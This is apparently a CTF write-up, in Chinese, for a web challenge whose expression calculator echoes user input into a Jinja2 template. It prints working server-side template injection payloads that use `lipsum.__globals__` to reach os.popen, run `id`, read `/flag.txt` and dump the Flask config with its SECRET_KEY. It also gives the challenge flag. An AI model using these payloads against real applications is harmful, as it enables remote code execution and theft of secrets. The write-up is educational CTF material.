# Clearline

> **类别:** Beginner / PPC · **赛事:** KubSTU CTF 2026 Autumn
> 作者团队: mpei_larpers · 来源: https://ctftime.org/writeup/41131 (CTFtime 社区题解)

## 📌 题目

http://159.194.244.226:8082/ — "CLEARLINE - Expression Console"。只有一个输入框，按照严格的文法计算算术表达式：数字、`+ - * / // % **`、括号、一元符号；幂次上限为 64，中间值保持在 2**4096 以下，输入限制为 512 个字符。计算器本身做得很规矩：名称、调用、属性和字符串都在 AST 层被切掉，针对本地 CPython 对 700 个表达式做随机差分模糊测试也没有发现任何不一致。想攻破计算器是没用的。

## 🏁 解题过程

漏洞不在计算器里，而在回显上。输入的表达式会被打印回页面的结果面板，而这份副本在服务器上作为 Jinja2 模板被渲染。判定结果（"这不是数值表达式"）根本不重要，渲染照样发生：

```bash
curl 'http://159.194.244.226:8082/?expr={{7*7}}'
# 在 Input 行中: 49
```

接下来就是经典的 SSTI。通过 Jinja 的内置全局变量 `lipsum`/`cycler` 及其 `__globals__` 拿到 os 模块，这就已经是命令执行了：

```
?expr={{lipsum.__globals__['os'].popen('id').read()}}
    -> uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),0(root)
```

容器里的 flag 位于 /flag.txt（43 字节，所有人可读）：

```
?expr={{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
    -> kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}
```

顺便还把 `{{config}}` 也拉了出来——整个 Flask 配置连同 SECRET_KEY，所以有漏洞的不只是渲染。又通过 `cycler.__init__.__globals__.os` 链再读了一次 flag——值是一样的。

**Flag:** `kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}`
